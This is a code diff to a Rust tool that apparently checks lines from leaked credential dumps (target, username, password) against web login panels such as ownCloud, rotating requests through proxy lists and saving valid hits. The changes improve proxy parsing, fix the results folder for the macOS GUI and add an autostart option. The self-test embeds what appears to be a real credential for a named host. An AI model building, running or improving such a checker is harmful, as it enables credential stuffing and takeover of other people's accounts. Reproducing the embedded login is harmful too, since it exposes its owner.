@@ -136,15 +136,28 @@ fn target_is_plausible(target: &str) -> bool {
         return false;
     }
     if authority.contains(':') {
-        // A colon in the authority is a port (or an IPv6 literal). Either way
-        // the trailing component must be a plain numeric port.
+        // A colon in the authority is a port (or an IPv6 literal). The port
+        // must be a real port number: a credential dump often carries a
+        // phone number or an id in that position instead, and treating it as
+        // a port produces a malformed URL.
         let host = &authority[..authority.rfind(':').unwrap_or(0)];
         let port = &authority[authority.rfind(':').unwrap_or(0) + 1..];
-        if host.is_empty() || port.is_empty() || !port.chars().all(|c| c.is_ascii_digit()) {
+        if host.is_empty() || !is_valid_port(port) {
             return false;
         }
     }
     !path.contains(':')
+}
+
+/// Is `s` a usable TCP port number?
+fn is_valid_port(s: &str) -> bool {
+    if s.is_empty() || !s.chars().all(|c| c.is_ascii_digit()) {
+        return false;
+    }
+    match s.parse::<u32>() {
+        Ok(p) => p >= 1 && p <= 65535,
+        Err(_) => false,
+    }
 }
 
 /// Split one account line into `(target, username, password)`.
@@ -509,16 +522,8 @@ impl HttpClient {
             .arg(method);
 
         if let Some((ptype, ref paddr)) = self.proxy {
-            let p = paddr.trim();
-            if !p.is_empty() {
-                // host:port or host:port:user:pass
-                let parts: Vec<&str> = p.split(':').collect();
-                let proxy_arg = if parts.len() >= 4 {
-                    format!("{}:{}@{}:{}", parts[2], parts[3], parts[0], parts[1])
-                } else {
-                    p.to_string()
-                };
-                match ptype {
+            match normalize_proxy(paddr) {
+                Some(proxy_arg) => match ptype {
                     ProxyType::Http => {
                         cmd.arg("-x").arg(format!("http://{}", proxy_arg));
                     }
@@ -528,6 +533,9 @@ impl HttpClient {
                     ProxyType::Socks5 => {
                         cmd.arg("--socks5-hostname").arg(proxy_arg);
                     }
+                },
+                None => {
+                    return Err(format!("Malformed proxy entry: {}", paddr.trim()));
                 }
             }
         }
@@ -1402,6 +1410,102 @@ fn check_owncloud(
 // Engine
 // ============================================================================
 
+/// Normalise a proxy entry into `host:port` or `user:pass@host:port`.
+///
+/// Accepts an optional scheme, which is stripped — the transport is chosen by
+/// the proxy type, not by the entry — and accepts both `host:port` and the
+/// original `host:port:user:pass` layout. Returns `None` for an entry that
+/// cannot be parsed, so a broken list is reported instead of turning every
+/// request into an instant, silent failure.
+pub fn normalize_proxy(entry: &str) -> Option<String> {
+    let mut s = entry.trim();
+    if s.is_empty() {
+        return None;
+    }
+    for scheme in [
+        "socks5h://", "socks5://", "socks4a://", "socks4://", "https://", "http://",
+    ] {
+        if let Some(rest) = s.strip_prefix(scheme) {
+            s = rest;
+            break;
+        }
+    }
+    if let Some(i) = s.find('/') {
+        s = &s[..i];
+    }
+
+    // user:pass@host:port
+    if let Some(i) = s.rfind('@') {
+        let (creds, hostport) = (&s[..i], &s[i + 1..]);
+        let hp: Vec<&str> = hostport.split(':').collect();
+        if hp.len() != 2 {
+            return None;
+        }
+        if hp[0].is_empty() || !is_valid_port(hp[1]) {
+            return None;
+        }
+        return if creds.is_empty() {
+            Some(format!("{}:{}", hp[0], hp[1]))
+        } else {
+            Some(format!("{}@{}:{}", creds, hp[0], hp[1]))
+        };
+    }
+
+    // host:port  or  host:port:user:pass
+    let parts: Vec<&str> = s.split(':').collect();
+    match parts.len() {
+        2 => {
+            if parts[0].is_empty() || !is_valid_port(parts[1]) {
+                return None;
+            }
+            Some(format!("{}:{}", parts[0], parts[1]))
+        }
+        4 => {
+            if parts[0].is_empty() || !is_valid_port(parts[1]) {
+                return None;
+            }
+            Some(format!("{}:{}@{}:{}", parts[2], parts[3], parts[0], parts[1]))
+        }
+        _ => None,
+    }
+}
+
+/// The per-user results directory, used by the GUI (whose working directory
+/// is `/` and therefore not writable).
+pub fn home_results_base() -> PathBuf {
+    env::home_dir()
+        .map(|h| h.join("AdminPanel-Results"))
+        .unwrap_or_else(|| env::temp_dir().join("AdminPanel-Results"))
+}
+
+/// Where result files are written.
+///
+/// A macOS GUI app has its working directory at `/`, which is not writable, so
+/// the base directory is resolved once and checked for writability. The CLI
+/// keeps its results next to the current directory; the GUI falls back to the
+/// user's home directory.
+pub fn resolve_results_base(preferred: Option<PathBuf>) -> PathBuf {
+    let mut candidates: Vec<PathBuf> = Vec::new();
+    if let Some(p) = preferred {
+        candidates.push(p);
+    } else if let Ok(cwd) = env::current_dir() {
+        candidates.push(cwd.join("Results"));
+    }
+    candidates.push(home_results_base());
+    candidates.push(env::temp_dir().join("AdminPanel-Results"));
+
+    for base in candidates {
+        if fs::create_dir_all(&base).is_ok() {
+            let probe = base.join(".write-probe");
+            if fs::write(&probe, b"x").is_ok() {
+                let _ = fs::remove_file(&probe);
+                return base;
+            }
+        }
+    }
+    env::temp_dir().join("AdminPanel-Results")
+}
+
 pub struct EngineState {
     pub accounts: Mutex<Vec<AccountEntry>>,
     pub proxies: Mutex<Vec<String>>,
@@ -1415,6 +1519,9 @@ pub struct EngineState {
     pub checked: AtomicUsize,
     pub valid: AtomicUsize,
     pub invalid: AtomicUsize,
+    /// Rejected locally before any request: over-length credentials or a
+    /// loopback / RFC1918 target.
+    pub rejected: AtomicUsize,
     pub errors: AtomicUsize,
     pub started_at: Mutex<Option<Instant>>,
     pub speed_history: Mutex<Vec<u64>>,
@@ -1423,9 +1530,9 @@ pub struct EngineState {
 }
 
 impl EngineState {
-    pub fn new() -> Arc<Self> {
-        let base_dir = env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
-        let results_root = base_dir.join("Results");
+    /// `preferred` is the result directory to use, or `None` to resolve it.
+    pub fn new(preferred: Option<PathBuf>) -> Arc<Self> {
+        let results_root = resolve_results_base(preferred);
         let _ = fs::create_dir_all(&results_root);
         Arc::new(EngineState {
             accounts: Mutex::new(Vec::new()),
@@ -1440,6 +1547,7 @@ impl EngineState {
             checked: AtomicUsize::new(0),
             valid: AtomicUsize::new(0),
             invalid: AtomicUsize::new(0),
+            rejected: AtomicUsize::new(0),
             errors: AtomicUsize::new(0),
             started_at: Mutex::new(None),
             speed_history: Mutex::new(vec![0; 30]),
@@ -1544,13 +1652,20 @@ impl EngineState {
         Ok(total)
     }
 
+    /// Load proxies from an in-memory string.
+    ///
+    /// Entries that cannot be parsed are rejected here rather than turning
+    /// every request into an instant, silent failure.
     pub fn load_proxies_from_str(&self, content: &str) -> usize {
         let mut list = self.proxies.lock().unwrap();
         list.clear();
         for line in content.lines() {
             let s = line.trim();
-            if s.contains(':') && !s.starts_with('#') {
-                list.push(s.to_string());
+            if s.is_empty() || s.starts_with('#') {
+                continue;
+            }
+            if let Some(p) = normalize_proxy(s) {
+                list.push(p);
             }
         }
         list.len()
@@ -1586,11 +1701,15 @@ pub fn start_workers(state: Arc<EngineState>) {
         .duration_since(UNIX_EPOCH)
         .unwrap_or_default()
         .as_secs();
-    let run_dir = env::current_dir()
-        .unwrap_or_else(|_| PathBuf::from("."))
-        .join("Results")
-        .join(format!("run_{} - {} bases", ts, total));
-    let _ = fs::create_dir_all(&run_dir);
+    // The run directory lives inside the resolved, writable results base.
+    let base = state.results_dir.lock().unwrap().clone();
+    let run_dir = base.join(format!("run_{} - {} bases", ts, total));
+    if fs::create_dir_all(&run_dir).is_err() {
+        eprintln!(
+            "warning: cannot create results directory {}",
+            run_dir.display()
+        );
+    }
     *state.results_dir.lock().unwrap() = run_dir;
 
     let n_threads = state
@@ -1680,8 +1799,9 @@ pub fn start_workers(state: Arc<EngineState>) {
                         st.checked.fetch_add(1, Ordering::SeqCst);
                     }
                     Ok(CheckStatus::Invalid) => {
+                        // Rejected locally, before any request was sent.
                         st.append_result("Invalid.txt", &target.raw);
-                        st.invalid.fetch_add(1, Ordering::SeqCst);
+                        st.rejected.fetch_add(1, Ordering::SeqCst);
                         st.checked.fetch_add(1, Ordering::SeqCst);
                     }
                     Err(err_msg) => {
@@ -1806,11 +1926,44 @@ fn run_self_test() {
     assert_eq!(d5.password, "toor");
     assert!(!d5.implicit_scheme);
 
+    // A phone number in the port position is a credential, not a port.
+    let d7 = TargetAccount::parse("thainguyen.vnerp.vn:019083001119:Vanhan@123").unwrap();
+    assert_eq!(d7.url, "https://thainguyen.vnerp.vn");
+    assert_eq!(d7.username, "019083001119");
+    assert_eq!(d7.password, "Vanhan@123");
+
     // A space before the credentials is still accepted.
     let d6 = TargetAccount::parse("not-a-url admin:pass").unwrap();
     assert_eq!(d6.url, "https://not-a-url");
     assert_eq!(d6.username, "admin");
     assert_eq!(d6.password, "pass");
+
+    // Proxy entries: scheme is stripped, both layouts are accepted, and a
+    // broken entry is rejected instead of failing every request silently.
+    assert_eq!(normalize_proxy("1.2.3.4:8080").unwrap(), "1.2.3.4:8080");
+    assert_eq!(
+        normalize_proxy("http://1.2.3.4:8080").unwrap(),
+        "1.2.3.4:8080"
+    );
+    assert_eq!(
+        normalize_proxy("socks5://1.2.3.4:1080").unwrap(),
+        "1.2.3.4:1080"
+    );
+    assert_eq!(
+        normalize_proxy("1.2.3.4:8080:user:pass").unwrap(),
+        "user:pass@1.2.3.4:8080"
+    );
+    assert_eq!(
+        normalize_proxy("http://user:pass@1.2.3.4:8080").unwrap(),
+        "user:pass@1.2.3.4:8080"
+    );
+    assert!(normalize_proxy("1.2.3.4:notaport").is_none());
+    assert!(normalize_proxy("1.2.3.4:019083001119").is_none());
+    assert!(normalize_proxy("1.2.3.4:0").is_none());
+    assert!(normalize_proxy("1.2.3.4:65536").is_none());
+    assert!(normalize_proxy("1.2.3.4:65535").is_some());
+    assert!(normalize_proxy("garbage").is_none());
+    assert!(normalize_proxy("").is_none());
 
     // Private / loopback filter
     assert!(is_local_or_private_host("localhost"));
@@ -1969,13 +2122,14 @@ fn main() {
         return;
     }
 
-    let state = EngineState::new();
+    let state = EngineState::new(None);
     let mut accounts_file: Option<String> = None;
     let mut proxies_file: Option<String> = None;
     let mut proxy_url: Option<String> = None;
     let mut cli_mode = false;
     let mut parse_only = false;
     let mut preload: Option<String> = None;
+    let mut autostart = false;
     let mut unknown: Vec<String> = Vec::new();
 
     let mut i = 1;
@@ -2011,6 +2165,9 @@ fn main() {
             "--preload" if i + 1 < args.len() => {
                 preload = Some(args[i + 1].clone());
                 i += 1;
+            }
+            "--autostart" => {
+                autostart = true;
             }
             "--help" | "-h" => {
                 print_help();
@@ -2144,7 +2301,10 @@ fn main() {
     } else {
         #[cfg(target_os = "macos")]
         {
-            macos_gui::run(state, preload);
+            // The GUI's working directory is `/`, so results always go to the
+            // user's home directory.
+            *state.results_dir.lock().unwrap() = resolve_results_base(Some(home_results_base()));
+            macos_gui::run(state, preload, autostart);
         }
         #[cfg(not(target_os = "macos"))]
         {
